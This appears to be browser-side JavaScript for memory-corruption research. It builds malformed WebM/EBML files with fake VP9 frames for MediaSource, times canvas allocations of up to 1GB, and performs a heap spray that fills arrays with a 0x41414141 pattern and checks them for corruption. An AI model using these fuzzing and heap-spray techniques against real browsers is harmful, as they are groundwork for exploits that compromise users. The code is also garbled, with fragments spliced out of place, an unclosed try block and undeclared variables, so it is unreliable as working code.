function buildEBML(id, data) {
  // Variable length integer encoding for WebM/EBML
  const idBytes = typeof id === 'string' ? 
    new Uint8Array(id.split(',').map(x => parseInt(x.trim()))) : id;
  
  let size = data.length;
  let sizeBytes = [];
  if (size < 0x7F) {
    sizeBytes = [0x80 | size];
  } else if (size < 0x3FFF) {
    sizeBytes = [0x40 | (size >> 8), size & 0xFF];
  } else if (size < 0x1FFFFF) {
    sizeBytes = [0x20 | (size >> 16), (size >> 8) & 0xFF, size & 0xFF];
  } else {
    sizeBytes = [0x10 | (size >> 24), (size >> 16) & 0xFF, (size >> 8) & 0xFF, size & 0xFF];
  }
  
  const result = new Uint8Array(idBytes.length + sizeBytes.length + data.length);
  result.set(idBytes, 0);
  result.set(new Uint8Array(sizeBytes), idBytes.length);
  result.set(data, idBytes.length + sizeBytes.length);
  return result;
}

function buildMinimalWebM() {
  // EBML ID: 0x1A45DFA3
  // DocType: 0x4282
  // DocTypeReadVersion: 0x4285
  // DocTypeVersion: 0x4287
  
  const doctype = buildEBML([0x42,0x82], new Uint8Array([0x77,0x65,0x62,0x6D])); // "webm"
  const readver = buildEBML([0x42,0x85], new Uint8Array([0x02]));
  const version = buildEBML([0x42,0x87], new Uint8Array([0x02]));
  const maxid = buildEBML([0x42,0xF2], new Uint8Array([0x04]));
  const maxsize = buildEBML([0x42,0xF3], new Uint8Array([0x08]));
  
  const ebmlContent = new Uint8Array(doctype.length + readver.length + version.length + maxid.length + maxsize.length);
  let off = 0;
  [doctype, readver, version, maxid, maxsize].forEach(a => { ebmlContent.set(a, off); off += a.length; });
  
  const ebml = buildEBML([0x1A,0x45,0xDF,0xA3], ebmlContent);
  
  // Segment with minimal content
  const segment = buildEBML([0x18,0x53,0x80,0x67], new Uint8Array([0x00,0x00,0x00,0x00]));
  
  const result = new Uint8Array(ebml.length + segment.length);
  result.set(ebml, 0);
  result.set(segment, ebml.length);
  return result;
}

async function webmMinimal() {
  log('=== 🧪 WebM Minimal EBML ===', 'gold');
  try {
    const data = buildMinimalWebM();
    log('Built '+data.length+' bytes WebM', 'info');
    
    const ms = new MediaSource();
    const url = URL.createObjectURL(ms);
    const v = document.createElement('video');
    v.src = url; v.muted = true;
    
    await new Promise(r => ms.addEventListener('sourceopen', r, {once:true}));
    const sb = ms.addSourceBuffer('video/webm; codecs="vp9"');
    
    sb.appendBuffer(data);
    await new Promise((resolve) => {
      const t = setTimeout(() => resolve('timeout'), 3000);
      sb.addEventListener('updateend', () => { clearTimeout(t); resolve('ok'); }, {once:true});

    URL.revokeObjectURL(url);

    log('WebM minimal error: '+e.name+': '+e.message, 'err');
  }
}

    ebmlContent.set(readver, doctype.length);

    // Fake VP9 frame data (0x82 = VP9 keyframe start)

    vp9Data[0] = 0x82; // VP9 OBU header
    vp9Data[1] = 0x49; // Profile 0
    vp9Data[2] = 0x83; // Show existing frame = false
    for (let i = 3; i < vp9Data.length; i++) vp9Data[i] = i & 0xFF;
    
    // SimpleBlock with VP9 data
    const block = buildEBML([0xA3], vp9Data);
    
    // Cluster
    const clusterContent = new Uint8Array(block.length + 8);
    clusterContent.set(block, 0);
    clusterContent.set([0xE7, 0x81, 0x00], block.length); // Timecode = 0
    const cluster = buildEBML([0x1F,0x43,0xB6,0x75], clusterContent);
    
    // Segment
    const segment = buildEBML([0x18,0x53,0x80,0x67], cluster);
    
    const result = new Uint8Array(ebml.length + segment.length);
    result.set(ebml, 0);
    result.set(segment, ebml.length);

function canvasSingleTiming() {
  log('=== ⏱ Single Allocation Timing ===', 'ok');
  const sizes = [0x1000, 0x2000, 0x4000, 0x6000, 0x8000, 0xA000, 0xC000];
  
  for (const size of sizes) {
    const mb = (size * size * 4 / 1024 / 1024).toFixed(1);
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      const t0 = performance.now();
      const id = ctx.createImageData(size, size);
      const elapsed = performance.now() - t0;
      log(size+'x'+size+' ('+mb+'MB): '+elapsed.toFixed(2)+'ms', 'ok');
    } catch(e) {
      log(size+'x'+size+' ('+mb+'MB): '+e.name, 'err');
    }
  }
}

async function canvasRapidTiming() {
  log('=== ⏱ Rapid Allocation Timing ===', 'ok');
  const size = 0x4000; // 16384 = 1GB
  const mb = (size * size * 4 / 1024 / 1024).toFixed(0);

      const ctx = c.getContext('2d');

      log('Alloc '+i+': '+mb+'MB in '+elapsed.toFixed(0)+'ms', elapsed > 100 ? 'warn' : 'ok');

}

function canvasSprayPattern() {
  log('=== 🎯 Heap Spray Pattern ===', 'ok');
  // Allocate objects with specific patterns
  const PATTERN = 0x41414141;
  const arrays = [];
  
  for (let i = 0; i < 100; i++) {
    const arr = new Uint32Array(0x1000);
    arr.fill(PATTERN + i);
    arrays.push(arr);
  }
  
  log('Sprayed 100 arrays x 16KB with pattern 0x'+PATTERN.toString(16), 'ok');
  log('Total: '+(100 * 16 / 1024).toFixed(2)+'MB', 'info');
  
  // Verify patterns
  let corrupted = 0;
  for (let i = 0; i < arrays.length; i++) {
    if (arrays[i][0] !== PATTERN + i) corrupted++;
  }
  log('Corrupted arrays: '+corrupted, corrupted > 0 ? 'err' : 'ok');
}
